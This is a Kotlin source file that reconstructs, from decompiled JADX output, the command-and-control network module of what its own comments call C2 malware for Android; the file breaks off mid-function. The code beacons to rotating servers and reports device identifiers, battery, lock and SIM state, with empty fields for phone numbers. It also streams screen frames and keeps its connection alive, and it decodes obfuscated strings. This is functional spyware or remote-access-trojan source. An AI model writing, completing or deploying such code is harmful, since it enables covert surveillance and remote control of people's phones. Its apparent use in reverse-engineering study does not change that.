package com.storm.safe.rock.service.modules

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.storm.safe.rock.network.DataSyncClient
import com.storm.safe.rock.util.StringUtil
import org.json.JSONException
import org.json.JSONObject
import java.util.concurrent.LinkedBlockingQueue
import kotlin.math.min
import kotlin.random.Random

/**
 * Coordinates all C2 communication via DataSyncClient.
 *
 * Reverse-engineered from JADX reference: C0323a8 (1,734 lines).
 * Manages WebSocket lifecycle, heartbeat mechanism, device registration,
 * reconnection with exponential backoff, network monitoring, message queue,
 * and screen frame deduplication/dispatch.
 *
 * Field mapping from JADX:
 * - f53097e0 → Companion (singleton)
 * - f53098e1 → lockObject
 * - f53099e2 → instance (volatile singleton)
 * - f53100a0 → context
 * - f53101a1 → httpManager (C0268a1)
 * - f53102a2 → dataSyncClient (C0267a0)
 * - f53103a3 → isConnected
 * - f53104a4 → isRegistered
 * - f53105a5 → serverHost
 * - f53106a6 → serverPort
 * - f53107a7 → sessionId / deviceId
 * - f53108a8 → serverUrls (list)
 * - f53109a9 → currentServerIndex
 * - f53110b0 → consecutiveFailures
 * - f53111b1 → MAX_CONSECUTIVE_FAILURES (5)
 * - f53112b2 → failureLock
 * - f53113b3 → keepAliveLock
 * - f53114b4 → networkCallback (mj0)
 * - f53115b5 → connectivityManager
 * - f53116b6 → lastHeartbeatTime
 * - f53117b7 → commandCallback (Lambda)
 * - f53118b8 → isInitialized
 * - f53119b9 → connectionMutex (C0789a0)
 * - f53120c0 → lastSyncedUrl
 * - f53121c1 → keepAliveJob (u11)
 * - f53122c2 → HEARTBEAT_INTERVAL_MS (25000)
 * - f53123c3 → BASE_RECONNECT_DELAY_MS (5000)
 * - f53124c4 → MAX_RECONNECT_DELAY_MS (30000) // ADAPT: JADX 30s, task spec says 300s
 * - f53125c5 → signalChannel (C0794ks)
 * - f53126c6 → heartbeatCount
 * - f53127c7 → maxInitialHeartbeats (5)
 * - f53128c8 → totalHeartbeats
 * - f53129c9 → cachedBatteryLevel (-1)
 * - f53130d0 → cachedIsCharging
 * - f53131d1 → lastFrameLogTime
 * - f53132d2 → frameQueue (LinkedBlockingQueue(10))
 * - f53133d3 → frameSenderStarted
 * - f53134d4 → lastFrameHash
 * - f53135d5 → frameSkippedCount
 * - f53136d6 → frameStatsLogTime
 * - f53137d7 → frameSentCount
 * - f53138d8 → frameSkippedTotal
 * - f53139d9 → lastFrameTime
 */
class NetworkManager {

    // =========================================================================
    // Connection state machine — JADX: volatile booleans + mutex
    // =========================================================================

    enum class ConnectionState {
        DISCONNECTED,
        CONNECTING,
        CONNECTED,
        RECONNECTING
    }

    // =========================================================================
    // Companion / Singleton — JADX: lj0, f53097e0, f53098e1, f53099e2
    // =========================================================================

    companion object {
        private const val TAG = "NetworkManager"

        // JADX: f53098e1 — lock object for singleton
        private val singletonLock = Any()

        // JADX: f53099e2 — volatile singleton instance
        @Volatile
        @JvmStatic
        var instance: NetworkManager? = null
            private set

        // ── Reconnection constants ──
        // JADX: f53123c3
        const val BASE_RECONNECT_DELAY_MS = 5000L
        // JADX: f53124c4 — ADAPT: JADX uses 30s, task spec says 300s (5min).
        // Using 300s as per task spec for max delay.
        const val MAX_RECONNECT_DELAY_MS = 300000L
        const val JITTER_MAX_MS = 2000L

        // ── Heartbeat constants ──
        // JADX: f53122c2
        const val HEARTBEAT_INTERVAL_MS = 25000L
        const val HEARTBEAT_TIMEOUT_MS = 60000L

        // ── Frame queue ──
        // JADX: f53132d2 — LinkedBlockingQueue(10)
        const val MAX_FRAME_QUEUE_SIZE = 10

        // ── Message queue ──
        // ADAPT: offline message buffer, similar pattern to frame queue
        const val MAX_MESSAGE_QUEUE_SIZE = 10

        // ── Server failure threshold ──
        // JADX: f53111b1
        const val MAX_CONSECUTIVE_FAILURES = 5

        // ── Frame dedup window ──
        const val FRAME_DEDUP_WINDOW_MS = 3000L
        const val FRAME_STATS_INTERVAL_MS = 30000L
        const val FRAME_LOG_THROTTLE_MS = 10000L

        /**
         * Parse a server URL into (host, port) pair.
         * Handles ws://, wss://, http://, https:// schemes.
         * JADX: a9 (static)
         */
        @JvmStatic
        fun parseServerUrl(url: String): Pair<String, Int> {
            if (url.isBlank()) return Pair("localhost", 8080)
            var working = url
            // Handle semicolon-separated lists — take last
            if (working.contains(";")) {
                working = working.split(";").last().trim()
            }
            val secure = isSecure(working)
            // Strip scheme
            working = working
                .replace("ws://", "")
                .replace("wss://", "")
                .replace("http://", "")
                .replace("https://", "")
            // Strip path
            working = working.split("/").first()
            if (working.isBlank()) {
                return Pair("localhost", if (secure) 443 else 8080)
            }
            val parts = working.split(":")
            val host = parts.firstOrNull()?.takeIf { it.isNotBlank() } ?: "localhost"
            val port = if (parts.size > 1) {
                parts[1].toIntOrNull() ?: if (secure) 443 else 8080
            } else {
                if (secure) 443 else 8080
            }
            return Pair(host, port)
        }

        /**
         * Check if URL uses secure scheme (https/wss).
         * JADX: d5 (static)
         */
        @JvmStatic
        fun isSecure(url: String): Boolean {
            return url.startsWith("https://", ignoreCase = true) ||
                url.startsWith("wss://", ignoreCase = true)
        }
    }

    // =========================================================================
    // State fields — matching JADX C0323a8
    // =========================================================================

    // JADX: f53100a0
    private var context: Context? = null

    // JADX: f53102a2
    private var dataSyncClient: DataSyncClient? = null

    // JADX: f53101a1 — HTTP manager reference
    // ADAPT: not fully replicated here — separate HttpManager class
    // private var httpManager: HttpManager? = null

    // ── Connection state ──

    // JADX: f53103a3
    @Volatile
    var isConnected: Boolean = false
        internal set

    // JADX: f53104a4
    @Volatile
    var isRegistered: Boolean = false
        internal set

    // JADX: f53118b8
    @Volatile
    var isInitialized: Boolean = false
        internal set

    @Volatile
    var connectionState: ConnectionState = ConnectionState.DISCONNECTED
        private set

    // ── Server config ──

    // JADX: f53105a5
    var serverHost: String = ""
        internal set

    // JADX: f53106a6
    var serverPort: Int = 8080
        internal set

    // JADX: f53107a7
    var deviceId: String = ""
        internal set

    var serverUrl: String = ""
        private set

    // JADX: f53107a7 (alias)
    var sessionId: String = ""
        private set

    // JADX: f53108a8
    var serverUrls: List<String> = emptyList()
        internal set

    // JADX: f53109a9
    @Volatile
    var currentServerIndex: Int = 0
        internal set

    // ── Heartbeat state ──

    // JADX: f53126c6
    @Volatile
    var heartbeatCount: Int = 0
        internal set

    // JADX: f53128c8
    @Volatile
    var totalHeartbeats: Int = 0
        internal set

    // JADX: f53127c7
    private val maxInitialHeartbeats: Int = 5

    // JADX: f53116b6
    @Volatile
    var lastHeartbeatTime: Long = 0L
        internal set

    // ── Failure tracking ──

    // JADX: f53110b0
    @Volatile
    var consecutiveFailures: Int = 0
        internal set

    // JADX: f53112b2 — lock for failure counter
    private val failureLock = Any()

    // JADX: f53113b3 — lock for keepalive job
    private val keepAliveLock = Any()

    // ── Battery cache ──

    // JADX: f53129c9
    @Volatile
    private var cachedBatteryLevel: Int = -1

    // JADX: f53130d0
    @Volatile
    private var cachedIsCharging: Boolean = false

    // ── Network monitoring ──

    // JADX: f53115b5
    private var connectivityManager: ConnectivityManager? = null

    // JADX: f53114b4
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    // ── Message queue for offline buffering ──

    // ADAPT: Offline message buffer, similar to frame queue pattern
    private val messageQueue = LinkedBlockingQueue<JSONObject>(MAX_MESSAGE_QUEUE_SIZE)

    // ── Frame queue (screen casting) ──

    // JADX: f53132d2
    private val frameQueue = LinkedBlockingQueue<ByteArray>(MAX_FRAME_QUEUE_SIZE)

    // JADX: f53133d3
    @Volatile
    private var frameSenderStarted: Boolean = false

    // JADX: f53134d4 — last frame FNV hash for dedup
    @Volatile
    private var lastFrameHash: Long = 0L

    // JADX: f53135d5
    @Volatile
    var frameSkippedCount: Int = 0
        internal set

    // JADX: f53137d7
    @Volatile
    var frameSentCount: Int = 0
        internal set

    // JADX: f53138d8
    @Volatile
    private var frameSkippedTotal: Int = 0

    // JADX: f53131d1 — throttle log for disconnected frame warnings
    @Volatile
    private var lastFrameLogTime: Long = 0L

    // JADX: f53136d6 — periodic stats log
    @Volatile
    private var frameStatsLogTime: Long = 0L

    // JADX: f53139d9 — last frame timestamp for dedup window
    @Volatile
    private var lastFrameTime: Long = 0L

    // ── Last synced URL for local-service config ──

    // JADX: f53120c0
    private var lastSyncedUrl: String = ""

    // ── Command callback ──

    // JADX: f53117b7
    @Volatile
    var commandCallback: ((JSONObject) -> Unit)? = null

    // ── Keepalive state ──

    private var keepAliveStarted: Boolean = false

    // =========================================================================
    // Lifecycle — initialize / connect / disconnect
    // =========================================================================

    /**
     * Initialize the network manager, set up clients and network monitoring.
     * JADX: b3
     *
     * Behavior:
     * - If already initialized and healthy → skip
     * - If initialized but zombie (job dead) → force restart keepalive
     * - If not initialized → full setup: deviceId, httpManager, dataSyncClient,
     *   network callback, keepalive job
     */
    fun initialize(context: Context) {
        if (isInitialized) {
            if (isHealthy()) {
                Log.d(TAG, "✅ 已初始化且健康，跳过")
                return
            }
            Log.w(TAG, "⚠️ 已初始化但内部 Job 已死（僵尸状态），强制重启保活机制")
            restartKeepAlive()
            return
        }

        try {
            this.context = context
            // JADX: get android_id as sessionId
            val androidId = try {
                android.provider.Settings.Secure.getString(
                    context.contentResolver, "android_id"
                ) ?: "unknown"
            } catch (e: Exception) {
                "unknown"
            }
            this.deviceId = androidId
            this.sessionId = androidId

            // Create DataSyncClient
            dataSyncClient = DataSyncClient(
                context,
                onMessageCallback = { message -> handleRemoteCommand(message) },
                onConnectionChanged = { connected ->
                    onConnectionStateChanged(connected)
                }
            )

            // Register network monitoring
            registerNetworkCallback()

            // Start keepalive
            startWebSocketKeepAlive()

            isInitialized = true
            instance = this
            Log.i(TAG, "✅ 网络管理器初始化完成")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 网络管理器初始化失败", e)
        }
    }

    /**
     * Set the C2 server URL and deviceId, then connect.
     * JADX: a7 (connectToServer coroutine, simplified to synchronous)
     */
    fun connectToServer(url: String, deviceId: String) {
        this.serverUrl = url
        this.deviceId = deviceId
        this.sessionId = deviceId
        dataSyncClient?.let { client ->
            client.serverUrl = url
            client.deviceId = deviceId
            Log.i(TAG, "Connecting to $url with deviceId=$deviceId")
            connectionState = ConnectionState.CONNECTING
            client.connect()
        }
    }

    /**
     * Disconnect from the server and clean up all state.
     * JADX: a3
     *
     * Resets: keepalive job, dataSyncClient disconnect, connection flags,
     * heartbeat counters, network callback, singleton reference.
     */
    fun disconnect() {
        try {
            // Cancel keepalive
            keepAliveStarted = false

            // Disconnect client
            dataSyncClient?.disconnect()

            // Reset connection state
            isConnected = false
            isRegistered = false
            heartbeatCount = 0
            totalHeartbeats = 0
            connectionState = ConnectionState.DISCONNECTED
        } catch (e: Exception) {
            Log.e(TAG, "断开连接失败", e)
        }

        // Unregister network monitoring
        unregisterNetworkCallback()

        // Additional cleanup matching JADX a3
        dataSyncClient?.let { client ->
            client.disconnect()
        }

        isInitialized = false
        instance = null
    }

    // =========================================================================
    // WebSocket connection state callback
    // =========================================================================

    /**
     * Called by DataSyncClient when connection state changes.
     * JADX: initialize$2 inner class callback.
     */
    private fun onConnectionStateChanged(connected: Boolean) {
        isConnected = connected
        if (connected) {
            connectionState = ConnectionState.CONNECTED
            Log.i(TAG, "✅ WebSocket 已连接")
            resetFailureCounter()

            // If not yet registered, trigger registration
            if (!isRegistered) {
                // ADAPT: In JADX this launches a coroutine to call connectToServer (a7)
                // which does HTTP registration. Simplified here.
                Log.d(TAG, "Triggering device registration")
            }

            // Drain queued messages
            drainMessageQueue()
        } else {
            connectionState = ConnectionState.DISCONNECTED
            Log.i(TAG, "📡 WebSocket 断开")
        }
    }

    // =========================================================================
    // Heartbeat mechanism — JADX: a0 (sendHeartbeat), a2 (buildPayload)
    // =========================================================================

    /**
     * Send a heartbeat ping to the server.
     * JADX: a0 (static method called on instance)
     *
     * Returns true if heartbeat was sent successfully.
     * On failure, marks isConnected = false.
     */
    fun sendHeartbeat(): Boolean {
        if (!isConnected || dataSyncClient == null) {
            return false
        }
        try {
            val payload = buildHeartbeatPayload()
            payload.put("type", StringUtil.decrypt("L1wHM049MyZSMDlNEz9MLA=="))
            payload.put("sessionId", deviceId)

            val client = dataSyncClient ?: return false
            if (!client.send(payload.toString())) {
                Log.w(TAG, "WS心跳发送失败")
                isConnected = false
                return false
            }

            // Update heartbeat time
            lastHeartbeatTime = System.currentTimeMillis()

            // Success: reset failure counter
            resetFailureCounter()

            // Increment heartbeat counters
            if (heartbeatCount < maxInitialHeartbeats) {
                heartbeatCount++
            }
            totalHeartbeats++

            return true
        } catch (e: Exception) {
            Log.w(TAG, "WS心跳失败: ${e.message}")
            isConnected = false
            return false
        }
    }

    /**
     * Build the heartbeat JSON payload with device state.
     * JADX: a2
     *
     * Contains: deviceId, timestamp, wsConnected, batteryLevel, isCharging,
     * isLocked, isScreenOn, networkType.
     * In early heartbeats (< maxInitialHeartbeats), also includes full device info.
     */
    fun buildHeartbeatPayload(): JSONObject {
        val json = JSONObject()

        // Core fields
        json.put("deviceId", deviceId)
        json.put("timestamp", System.currentTimeMillis())
        json.put("wsConnected", isConnected)

        // Battery state — JADX: register BATTERY_CHANGED receiver
        var batteryLevel = -1
        var isCharging = false
        try {
            val ctx = context
            if (ctx != null) {
                val batteryIntent = ctx.registerReceiver(
                    null,
                    IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                )
                if (batteryIntent != null) {
                    val level = batteryIntent.getIntExtra("level", -1)
                    val scale = batteryIntent.getIntExtra("scale", 100)
                    batteryLevel = if (level >= 0 && scale > 0) (level * 100) / scale else -1
                    val plugged = batteryIntent.getIntExtra("plugged", -1)
                    isCharging = plugged == 1 || plugged == 2 || plugged == 4
                }
            }
        } catch (_: Exception) {}

        // Fallback to BatteryManager
        if (batteryLevel < 0) {
            try {
                val ctx = context
                if (ctx != null) {
                    val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                    if (bm != null) {
                        val prop = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                        if (prop in 0..100) {
                            batteryLevel = prop
                            isCharging = bm.isCharging
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // Cache battery values
        if (batteryLevel > 0) {
            cachedBatteryLevel = batteryLevel
            cachedIsCharging = isCharging
        } else if (batteryLevel < 0 && cachedBatteryLevel > 0) {
            batteryLevel = cachedBatteryLevel
            isCharging = cachedIsCharging
        }

        if (batteryLevel >= 0) {
            json.put("batteryLevel", batteryLevel)
            json.put("isCharging", isCharging)
        }

        // Screen/lock state — JADX: PowerManager + KeyguardManager
        var isScreenOn = true
        var isLocked = false
        try {
            val ctx = context
            if (ctx != null) {
                val pm = ctx.getSystemService(Context.POWER_SERVICE) as? PowerManager
                isScreenOn = pm?.isInteractive ?: true

                val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                val keyguardLocked = km?.isKeyguardLocked ?: false
                isLocked = keyguardLocked || !isScreenOn
            }
        } catch (_: Exception) {}

        json.put("isLocked", isLocked)
        json.put("isScreenOn", isScreenOn)

        // Accessibility alive — ADAPT: stub for now
        json.put("accessibilityAlive", false)

        // Network type — ADAPT: would use AbstractC1229so.m214642a7
        json.put("networkType", "unknown")

        // SIM info every 10th heartbeat — JADX: totalHeartbeats % 10 == 0
        try {
            val ctx = context
            if (ctx != null && totalHeartbeats % 10 == 0) {
                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subCount = try { sm?.activeSubscriptionInfoCount ?: 0 } catch (_: Exception) { 0 }
                val simAbsent = try { tm?.simState == TelephonyManager.SIM_STATE_ABSENT } catch (_: Exception) { true }
                json.put("hasSim", subCount > 0 || !simAbsent)
            }
        } catch (_: Exception) {}

        // Include full device info in early heartbeats — JADX: heartbeatCount < maxInitialHeartbeats
        if (heartbeatCount < maxInitialHeartbeats) {
            try {
                json.put("model", Build.MODEL)
                json.put("brand", Build.BRAND)
                json.put("osVersion", Build.VERSION.RELEASE)
                json.put("manufacturer", Build.MANUFACTURER)
                // ADAPT: Would include appVersion, appName, etc. from DeviceInfoProvider
            } catch (_: Exception) {}
        }

        return json
    }

    // =========================================================================
    // Device registration — JADX: a1, a7
    // =========================================================================

    /**
     * Build full device info JSON for registration.
     * JADX: a1
     */
    fun buildDeviceInfo(): JSONObject {
        val json = JSONObject()
        val ctx = context

        json.put("deviceId", deviceId)
        json.put("model", Build.MODEL)
        json.put("brand", Build.BRAND)
        json.put("manufacturer", Build.MANUFACTURER)
        json.put("osVersion", Build.VERSION.RELEASE)
        json.put("sdkVersion", Build.VERSION.SDK_INT)

        // App info — ADAPT: would use DeviceInfoProvider
        json.put("appName", "")
        json.put("appVersion", "")

        // Battery
        json.put("batteryLevel", cachedBatteryLevel)
        json.put("isCharging", cachedIsCharging)

        // Screen dimensions — ADAPT: would use DisplayMetrics
        json.put("screenWidth", 0)
        json.put("screenHeight", 0)

        // Install time — ADAPT: would query PackageManager
        json.put("firstInstallTime", 0L)

        // SIM info — ADAPT: would query TelephonyManager
        json.put("hasSim", false)
        json.put("phoneNumber", "")
        json.put("phoneNumber2", "")

        // Network type
        json.put("networkType", "unknown")

        json.put("timestamp", System.currentTimeMillis())

        return json
    }

    // =========================================================================
    // Reconnection with exponential backoff
    // =========================================================================

    /**
     * Calculate reconnect delay with exponential backoff and jitter.
     *
     * JADX: implicit in keepalive loop pattern
     * Base: 5s, doubles each attempt, capped at 300s (5min).
     * Jitter: random 0-2s added.
     */
    fun calculateReconnectDelay(attempt: Int): Long {
        val exponentialDelay = BASE_RECONNECT_DELAY_MS * (1L shl min(attempt, 16))
        val cappedDelay = min(exponentialDelay, MAX_RECONNECT_DELAY_MS)
        val jitter = Random.nextLong(0, JITTER_MAX_MS + 1)
        return cappedDelay + jitter
    }

    // =========================================================================
    // Server URL management — JADX: b6, c0, b0, b2, d8, b8, b9
    // =========================================================================

    /**
     * Configure server URLs list from semicolon-separated string.
     * JADX: b6
     */
    fun setServerUrls(urls: String) {
        if (urls.isBlank()) return
        serverUrls = if (urls.contains(";")) {
            urls.split(";").map { it.trim() }.filter { it.isNotEmpty() }
        } else {
            listOf(urls.trim()).filter { it.isNotEmpty() }
        }

        if (serverUrls.isEmpty()) {
            Log.e(TAG, "❌ 服务器列表为空")
            return
        }

        Log.d(TAG, "📡 多服务器配置: ${serverUrls.size} 个服务器")
        serverUrls.forEachIndexed { index, url ->
            Log.d(TAG, "   [$index] $url")
        }

        currentServerIndex = 0
        consecutiveFailures = 0
    }

    /**
     * Get the current server URL from the list.
     * JADX: c0
     */
    fun currentUrl(): String? {
        if (serverUrls.isEmpty()) return null
        val idx = currentServerIndex
        return if (idx < 0 || idx >= serverUrls.size) {
            serverUrls.firstOrNull()
        } else {
            serverUrls[idx]
        }
    }

    /**
     * Apply current server URL to serverHost/serverPort fields and clients.
     * JADX: a4 (configureClients)
     */
    fun applyServerConfig() {
        if (serverUrls.isEmpty()) {
            Log.e(TAG, "❌ 服务器列表为空，无法配置")
            return
        }
        val url = currentUrl() ?: run {
            Log.e(TAG, "❌ 无法获取当前服务器URL")
            return
        }
        val (host, port) = parseServerUrl(url)
        serverHost = host
        serverPort = port

        val secure = isSecure(url)

        // Configure DataSyncClient WS URL
        dataSyncClient?.let { client ->
            val wsUrl = if (!secure) {
                "ws://$host:$port"
            } else if (port == 443) {
                "wss://$host"
            } else {
                "wss://$host:$port"
            }
            client.serverUrl = wsUrl.trimEnd('/')
            client.deviceId = deviceId
            Log.d(TAG, "✅ DataSyncClient 已配置: $wsUrl [服务器 ${currentServerIndex + 1}/${serverUrls.size}]")
        }
    }

    /**
     * Build HTTP base URL from current server.
     * JADX: b0
     */
    fun buildHttpUrl(): String? {
        val url = currentUrl() ?: return null
        val (host, port) = parseServerUrl(url)
        return if (isSecure(url)) {
            if (port == 443) "https://$host" else "https://$host:$port"
        } else {
            "http://$host:$port"
        }
    }

    /**
     * Build WebSocket URL from current server.
     * JADX: b2
     */
    fun buildWsUrl(): String {
        if (serverHost.isEmpty()) return ""
        val url = currentUrl() ?: ""
        return if (isSecure(url)) {
            if (serverPort == 443) "wss://$serverHost" else "wss://$serverHost:$serverPort"
        } else {
            if (serverPort == 80) "ws://$serverHost" else "ws://$serverHost:$serverPort"
        }
    }

    /**
     * Switch to the next server URL after failure.
     * JADX: d8
     *
     * Returns false if only one server available.
     * On switch: disconnects current WS, resets flags, reconfigures client.
     */
    fun switchToNextServer(): Boolean {
        synchronized(failureLock) {
            if (serverUrls.size <= 1) {
                Log.w(TAG, "⚠️ 只有一个服务器，无法切换")
                return false
            }
            val oldIndex = currentServerIndex
            currentServerIndex = (currentServerIndex + 1) % serverUrls.size
            consecutiveFailures = 0

            val newUrl = serverUrls[currentServerIndex]
            Log.i(TAG, "🔄 切换服务器: [${oldIndex + 1}] -> [${currentServerIndex + 1}] ($newUrl)")

            // Disconnect current, will be reconnected by keepalive
            dataSyncClient?.let { client ->
                client.disconnect()
                isConnected = false
            }
            isRegistered = false

            // Apply new server config
            try {
                applyServerConfig()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to apply server config after switch", e)
            }
            return true
        }
    }

    /**
     * Handle a connection failure: increment counter, switch server if threshold hit.
     * JADX: b8
     */
    fun handleConnectionFailure() {
        synchronized(failureLock) {
            consecutiveFailures++
            Log.w(TAG, "⚠️ 服务器连接失败 ($consecutiveFailures/$MAX_CONSECUTIVE_FAILURES)")

            if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
                Log.w(TAG, "❌ 服务器连续失败 $MAX_CONSECUTIVE_FAILURES 次，尝试切换")
                switchToNextServer()
            }
        }
    }

    /**
     * Reset failure counter after successful operation.
     * JADX: b9
     */
    fun resetFailureCounter() {
        synchronized(failureLock) {
            if (consecutiveFailures > 0) {
                Log.d(TAG, "✅ 服务器连接成功，重置失败计数")
                consecutiveFailures = 0
            }
        }
    }

    // =========================================================================
    // Network monitoring — JADX: b7 (register), d9 (unregister)
    // =========================================================================

    /**
     * Register ConnectivityManager.NetworkCallback to monitor network changes.
     * JADX: b7
     *
     * On network available → try reconnect if disconnected.
     * On network lost → mark disconnected, stop heartbeat.
     */
    fun registerNetworkCallback() {
        try {
            val ctx = context ?: return
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            connectivityManager = cm
            if (cm == null) {
                Log.w(TAG, "⚠️ ConnectivityManager 不可用")
                return
            }

            val callback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.d(TAG, "📶 网络可用")
                    if (!isConnected && isInitialized) {
                        Log.d(TAG, "尝试重连...")
                        // ADAPT: In JADX this triggers the reconnect signal channel
                    }
                }

                override fun onLost(network: Network) {
                    Log.d(TAG, "📵 网络丢失")
                    // ADAPT: Mark for reconnect when network returns
                }

                override fun onCapabilitiesChanged(
                    network: Network,
                    capabilities: NetworkCapabilities
                ) {
                    // Network capabilities changed
                }
            }

            networkCallback = callback
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(request, callback)
            Log.i(TAG, "✅ 网络变化监听已注册")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 注册网络回调失败", e)
        }
    }

    /**
     * Unregister the network callback.
     * JADX: d9
     */
    fun unregisterNetworkCallback() {
        try {
            val callback = networkCallback
            if (callback != null) {
                connectivityManager?.unregisterNetworkCallback(callback)
                Log.i(TAG, "✅ 网络变化监听已注销")
            }
            networkCallback = null
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ 注销网络回调失败: ${e.message}")
        }
    }

    // =========================================================================
    // Message queue for offline buffering
    // =========================================================================

    /** Capacity of the message queue. */
    val messageQueueCapacity: Int
        get() = MAX_MESSAGE_QUEUE_SIZE

    /** Current number of queued messages. */
    val messageQueueSize: Int
        get() = messageQueue.size

    /**
     * Queue a message for later sending when connection is restored.
     * If queue is full, evicts the oldest message.
     */
    fun queueMessage(message: JSONObject) {
        if (!messageQueue.offer(message)) {
            messageQueue.poll() // Evict oldest
            messageQueue.offer(message)
        }
    }

    /**
     * Drain the message queue, sending all queued messages.
     * Called after reconnection.
     */
    fun drainMessageQueue() {
        val client = dataSyncClient ?: return
        var msg = messageQueue.poll()
        while (msg != null) {
            try {
                client.send(msg.toString())
            } catch (e: Exception) {
                Log.w(TAG, "Failed to send queued message", e)
            }
            msg = messageQueue.poll()
        }
    }

    // =========================================================================
    // Screen frame sender — JADX: d1
    // =========================================================================

    /**
     * Send a screen frame for screen casting.
     * JADX: d1
     *
     * Features:
     * - Deduplicates identical frames within 3s window (FNV-1a hash)
     * - Queues frames to LinkedBlockingQueue(10)
     * - Lazy-starts a daemon sender thread
     * - Logs stats every 30s
     */
    fun sendScreenFrame(frameData: ByteArray) {
        if (!isConnected || dataSyncClient == null) {
            // Throttled warning
            val now = System.currentTimeMillis()
            if (now - lastFrameLogTime > FRAME_LOG_THROTTLE_MS) {
                lastFrameLogTime = now
                if (!isConnected) {
                    Log.w(TAG, "⚠️ [投屏] WebSocket未连接，屏幕数据无法发送")
                } else {
                    Log.w(TAG, "⚠️ [投屏] DataSyncClient未初始化")
                }
            }
            return
        }

        val now = System.currentTimeMillis()

        // FNV-1a hash for deduplication — JADX: exact algorithm
        var hash = -3750763034362895579L // FNV offset basis
        var i = 0
        while (i < frameData.size) {
            hash = (hash xor (frameData[i].toLong() and 0xFF)) * 1099511628211L
            i += 37
        }
        hash = hash xor frameData.size.toLong()

        // Dedup: skip identical frames within window
        if (hash == lastFrameHash && now - lastFrameTime < FRAME_DEDUP_WINDOW_MS) {
            frameSkippedCount++
            frameSkippedTotal++
            return
        }

        lastFrameHash = hash
        if (frameSkippedCount > 0) {
            frameSkippedCount = 0
        }
        lastFrameTime = now

        // Queue frame, evict oldest if full
        if (!frameQueue.offer(frameData)) {
            frameQueue.poll()
            frameQueue.offer(frameData)
        }

        // Lazy-start sender thread — JADX: kj0 thread
        if (!frameSenderStarted) {
            synchronized(this) {
                if (!frameSenderStarted) {
                    frameSenderStarted = true
                    val thread = Thread({
                        while (frameSenderStarted && isConnected) {
                            try {
                                val frame = frameQueue.poll()
                                if (frame != null) {
                                    dataSyncClient?.send(String(frame))
                                    frameSentCount++
                                }
                                Thread.sleep(10) // Yield
                            } catch (_: InterruptedException) {
                                break
                            } catch (e: Exception) {
                                Log.w(TAG, "Frame sender error: ${e.message}")
                            }
                        }
                        frameSenderStarted = false
                    }, "FrameSender")
                    thread.isDaemon = true
                    thread.start()
                }
            }
        }

        // Periodic stats logging — JADX: every 30s
        val statsTime = frameStatsLogTime
        if (now - statsTime > FRAME_STATS_INTERVAL_MS) {
            if (statsTime > 0) {
                val sent = frameSentCount
                val skipped = frameSkippedTotal
                val total = sent + skipped
                if (total > 0) {
                    val skipRate = (skipped * 100) / total
                    val queueSize = frameQueue.size
                    Log.d(TAG, "📊 [投屏统计] 发送=$sent 跳过=$skipped 跳过率=${skipRate}% 队列=$queueSize")
                }
            }
            frameSentCount = 0
            frameSkippedTotal = 0
            frameStatsLogTime = now
        }
    }

    // =========================================================================
    // WebSocket keepalive — JADX: d7
    // =========================================================================

    /**
     * Start periodic WebSocket keepalive mechanism.
     * JADX: d7
     *
     * Stub: real timer-based keepalive uses Handler + HandlerThread.
     * In the JADX source, this launches a coroutine job (u11) that periodically
     * calls sendHeartbeat and manages reconnection.
     */
    fun startWebSocketKeepAlive() {
        if (keepAliveStarted) return
        synchronized(keepAliveLock) {
            if (keepAliveStarted) return
            keepAliveStarted = true
            Log.d(TAG, "启动：WS保活")
            // ADAPT: Real implementation uses coroutine job (u11)
            // that periodically sends heartbeats and reconnects on failure.
            // For unit testing purposes, heartbeat is triggered via sendHeartbeat().
        }
    }

    /**
     * Force restart the keepalive mechanism.
     * Called when zombie state detected.
     */
    private fun restartKeepAlive() {
        Log.w(TAG, "⚠️ 强制重启保活机制...")
        try {
            keepAliveStarted = false
        } catch (_: Exception) {}

        // Re-register network monitoring
        try {
            unregisterNetworkCallback()
        } catch (_: Exception) {}
        registerNetworkCallback()

        startWebSocketKeepAlive()
        Log.i(TAG, "✅ 保活机制已重启")
    }

    // =========================================================================
    // Health checks — JADX: b4, b5, a8
    // =========================================================================

    /**
     * Check if connection is healthy (initialized + keepalive active).
     * JADX: b4
     */
    fun isHealthy(): Boolean {
        return isInitialized && (isConnected || keepAliveStarted)
    }

    /**
     * Check if fully connected (initialized + healthy + WS connected).
     * JADX: b5
     */
    fun isFullyConnected(): Boolean {
        return isInitialized && isHealthy() && isConnected
    }

    /**
     * Force reconnect if in zombie state.
     * JADX: a8
     */
    fun ensureConnected() {
        if (!isInitialized) {
            Log.w(TAG, "⚠️ 未初始化，执行初始化")
            // ADAPT: In JADX this calls b3 (initialize). Here we just return
            // since we need a Context to initialize.
            return
        }
        if (isHealthy()) return

        Log.w(TAG, "⚠️ 检测到僵尸状态，重启保活...")
        restartKeepAlive()
    }

    // =========================================================================
    // Send methods — typed message senders
    // =========================================================================

    /**
     * Send a generic event with the given type and data payload.
     * JADX: c4 (sendEvent$2)
     */
    fun sendEvent(type: String, data: JSONObject) {
        val client = dataSyncClient ?: return
        if (!isConnected && client.isConnected.not()) {
            Log.w(TAG, "⚠️ 无法发送事件 $type: wsConnected=$isConnected")
            return
        }
        try {
            val envelope = buildEnvelope(type, data)
